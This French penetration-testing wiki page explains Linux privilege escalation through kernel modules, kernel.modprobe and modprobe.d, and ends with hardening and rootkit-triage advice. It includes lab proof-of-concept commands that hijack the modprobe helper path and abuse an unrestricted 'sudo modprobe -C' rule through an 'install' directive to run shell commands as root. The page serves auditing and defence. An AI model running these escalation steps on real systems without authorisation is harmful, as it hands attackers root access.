# Modules du noyau et abus de modprobe

{{#include ../../banners/hacktricks-training.md}}

## Mauvaises configurations des modules du noyau et de leur chargement

La prise en charge des modules du noyau est un domaine à fort impact lors de l’analyse d’une élévation de privilèges sous Linux. Ne considérez pas chaque message indiquant qu’un module n’est pas signé comme exploitable en soi, mais servez-vous-en pour répondre à des questions pratiques.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- L’utilisateur actuel peut-il charger des modules via `sudo`, des capabilities ou un chemin vers un helper accessible en écriture ?
- Le chargement des modules est-il toujours activé ?
- La vérification des signatures des modules est-elle désactivée ?
- Les répertoires de modules, les fichiers de modules ou les chemins de configuration `modprobe.d` sont-ils accessibles en écriture ?<sup>[[16]](#references)</sup>
- Les journaux du noyau peuvent-ils être lus pour confirmer ce qui s’est passé ?

Un triage rapide commence par les vérifications suivantes de l’état des modules, des signatures, des journaux et de l’arborescence des modules.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interprétation :

- `modules_disabled=1` signifie que les modules ne peuvent être ni chargés ni déchargés, et que cette valeur ne peut pas être réinitialisée à `0` avant le redémarrage.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` sur la ligne de commande du noyau ou `CONFIG_MODULE_SIG_FORCE=y` exige des modules correctement signés ; sinon, des modules non signés peuvent être chargés et marquer le noyau comme tainted.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` n’impose aucune restriction à `dmesg` ; lorsqu’il vaut `1`, l’accès nécessite `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Les chemins accessibles en écriture sous `/lib/modules/$(uname -r)/` sont dangereux, car `modprobe` parcourt cette arborescence et ses données de dépendances lors du chargement des modules.<sup>[[8]](#references)</sup>

### Charger un module et lire la sortie du noyau

Si vous avez l’autorisation légitime de charger un module local, `insmod` insère exactement le fichier `.ko` que vous lui fournissez. La fonction d’initialisation du module s’exécute lors du chargement, et les messages écrits avec `printk()` sont envoyés au tampon du journal du noyau, que l’on consulte généralement avec `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Un processus minimal de vérification utilise `modinfo` pour examiner les métadonnées, `insmod` et `rmmod` pour charger et supprimer un module, `lsmod` pour confirmer son état de chargement et `dmesg` pour consulter les journaux du noyau.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Si `sudo -l` autorise `insmod`, `modprobe` ou un wrapper autour de ces commandes, considérez cela comme critique : `sudo -l` répertorie les privilèges de l'utilisateur qui l'exécute, et le chargement d'un module du kernel nécessite `CAP_SYS_MODULE`. Consultez [les capabilities Linux](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) pour les voies d'accès directes fondées sur les capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` autorisé via sudo

Une règle sudo qui autorise un utilisateur à exécuter `insmod` n’est pas comparable à l’autorisation d’utiliser un utilitaire administratif classique. Le code d’initialisation du module s’exécute lors de son insertion ; la question pratique à examiner est donc de savoir si cet utilisateur peut choisir ou modifier le module chargé.<sup>[[3]](#references)</sup>

Le processus d’examen générique suivant répète ces vérifications concernant l’inspection, le chargement, l’état, les journaux et la suppression d’un module candidat.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Si l’utilisateur peut fournir un fichier `.ko` arbitraire, il faut considérer cela comme une compromission complète du système dans le cadre d’une évaluation autorisée. Une pratique opérationnelle plus sûre consiste à éviter de déléguer le chargement de modules via sudo ; si cela est inévitable, il faut restreindre le chemin exact, la propriété, les permissions, la politique de signature et la procédure de suppression.<sup>[[3]](#references)[[10]](#references)</sup>

Pour une méthode sans danger de compilation de module dans un lab contrôlé, un code source minimal et un Makefile sont présentés ci-dessous ; la forme `make -C /lib/modules/$(uname -r)/build M=$PWD` suit le workflow kbuild documenté par le kernel pour les modules externes.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Construisez et chargez uniquement dans un laboratoire autorisé ; kbuild compile le module externe et les commandes de chargement et de déchargement font appel aux interfaces de modules du noyau.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Vérifications d’abus de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` désigne le helper userspace que le kernel exécute pour les demandes de chargement automatique de modules ; ce sysctl concerne le chargement automatique, pas l’insertion explicite de modules. Si un attaquant peut le modifier pour pointer vers un chemin exécutable accessible en écriture et déclencher une demande de module, ce helper devient un vecteur d’exécution de code privilégié. Le définir sur une chaîne vide désactive les demandes de chargement automatique ; si `CONFIG_STATIC_USERMODEHELPER=y`, toute valeur non vide est remplacée par le chemin du helper statique intégré à la compilation.<sup>[[1]](#references)</sup>

Vérifiez le chemin actuel du helper via l’interface sysctl du kernel et examinez le propriétaire et les permissions de la cible.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Vérifiez si sysctl, les règles sudo déléguées ou les capacités de fichiers peuvent être influencés.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Le modèle suivant, réservé au laboratoire, modifie le chemin de l’assistant et déclenche une demande documentée de chargement automatique d’un module ; utilisez-le uniquement sur un système isolé et autorisé.<sup>[[1]](#references)</sup>

Sur les noyaux Linux actuels, n’utilisez pas un exécutable inconnu comme déclencheur générique : le chargement automatique historique de modules pour les formats binaires personnalisés a été supprimé dans Linux 6.14, tandis que la documentation du noyau indique qu’un type de système de fichiers inconnu constitue une voie de demande de chargement automatique d’un module.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Sur les systèmes renforcés, cette opération devrait échouer si les permissions empêchent les écritures non privilégiées dans `kernel.modprobe`, si le chemin de l’assistant n’est pas accessible en écriture ou si le chargement automatique des modules est désactivé.<sup>[[1]](#references)</sup>

### Configuration `modprobe.d` accessible en écriture et `sudo modprobe -C`

Avant de résoudre un module, `modprobe` lit les fichiers `.conf` dans les répertoires de configuration tels que `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` et `/lib/modprobe.d`, par ordre de priorité. Un fichier portant le même nom dans un répertoire de priorité supérieure masque le fichier de priorité inférieure. Plus important encore, une directive `install <module> <command>` exécute une commande shell arbitraire **à la place** de l’insertion de ce module. Ainsi, un chemin de configuration accessible en écriture peut permettre l’exécution différée d’une commande avec les privilèges d’un utilisateur qui lancera ultérieurement `modprobe` avec des privilèges élevés ; l’application de la signature des modules du noyau n’authentifie pas cette commande en espace utilisateur.<sup>[[16]](#references)</sup>

Vérifiez les permissions des répertoires et des fichiers, puis examinez la configuration effective. `modprobe -n -v` permet d’examiner la résolution sans risque, car le mode dry-run n’insère pas le module et n’exécute aucune commande `install`/`remove`. Préférez `modprobe -c` à la syntaxe historique `--showconfig`, que la documentation actuelle de kmod indique comme devant être supprimée après kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Une règle sudo sans restriction pour `modprobe` est exploitable même lorsque la vérification de signature empêche le chargement de fichiers `.ko` arbitraires : `-C` sélectionne un répertoire de configuration contrôlé par l’attaquant, à partir duquel le processus lancé par sudo peut exécuter une commande `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Pour atténuer le risque, n’autorisez pas l’exécution de `modprobe` avec des arguments sans restriction via sudo, veillez à ce que tous les répertoires de configuration appartiennent à root et ne soient pas modifiables, et examinez les directives `install`/`remove` inattendues. Lorsqu’un processus administratif de confiance doit contourner ces directives pour un module, `modprobe --ignore-install` les ignore pour ce module précis, mais les dépendances peuvent avoir leurs propres commandes.<sup>[[8]](#references)[[16]](#references)</sup>

### Vérification des répertoires `/lib/modules` modifiables

Des répertoires de modules modifiables peuvent permettre le remplacement de modules, l’installation de modules malveillants ou l’exploitation du chargement automatique, selon la manière dont `modprobe` est ensuite invoqué ; `modprobe` recherche les modules dans `/lib/modules/$(uname -r)` et utilise les données de dépendances qui s’y trouvent pour résoudre les modules.<sup>[[8]](#references)</sup>

Vérifiez les fichiers de modules modifiables ainsi que les métadonnées de dépendances et d’alias dans l’arborescence des modules de la version du noyau active.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Si vous trouvez du contenu de module modifiable, examinez comment `modprobe` résout les dépendances et comment `modinfo` affiche les métadonnées du module.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Notes défensives :

- Gardez `/lib/modules` appartenant à `root:root` et non modifiable par les utilisateurs.<sup>[[8]](#references)</sup>
- Définissez `kernel.modules_disabled=1` après le démarrage, lorsque cela est opérationnellement possible.<sup>[[1]](#references)</sup>
- Appliquez la signature des modules sur les systèmes qui nécessitent des modules chargeables.<sup>[[2]](#references)</sup>
- Surveillez les écritures dans `/proc/sys/kernel/modprobe`, `/lib/modules` et les répertoires de configuration `modprobe.d`, ainsi que toute exécution inattendue de `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Triage des rootkits basés sur des modules

Un module malveillant peut intercepter les appels système, les vues VFS ou `/proc`, les chemins réseau ou les vérifications d’identifiants afin de masquer des processus et des fichiers, de rediriger le trafic ou d’intercepter des secrets. Il peut également se retirer de la liste des modules affichée par `lsmod`. La persistance peut provenir d’alias ou de règles d’installation dans `modprobe.d`, de `/etc/modules-load.d`, d’une unité systemd, du contenu de l’initramfs ou du remplacement d’un fichier `.ko` légitime. Un résultat `lsmod` normal constitue un élément utile, mais une compromission au niveau du noyau peut rendre les listes fournies par le noyau peu fiables. Recoupez les modules chargés, les fichiers sur disque, la configuration de démarrage, les journaux de chargement des modules et la télémétrie externe de confiance.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Examinez les noms de modules, les chemins, les dépendances, les signatures et les temps de chargement inattendus. Les messages concernant le taint du noyau et les modules non signés sont des pistes, pas des preuves de la présence d’un rootkit. Si un rootkit est suspecté, recueillez des éléments de preuve à partir d’une image ou d’un environnement de récupération de confiance avant de vous fier aux données du noyau en fonctionnement. La page [évaluation des vulnérabilités du noyau](kernel-vulnerability-assessment.md) traite de la configuration et de l’exposition des diagnostics, notamment de tracefs et des objets BPF épinglés.

## References

- [1] [Documentation de /proc/sys/kernel/ — Documentation du noyau Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mécanisme de signature des modules du noyau — Documentation du noyau Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Page de manuel Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Notions de base sur les pilotes — Documentation du noyau Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Journalisation des messages avec printk — Documentation du noyau Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Compilation de modules externes — Documentation du noyau Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Page de manuel Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Fusionner la balise « execve-v6.14-rc1 » — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Page de manuel Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
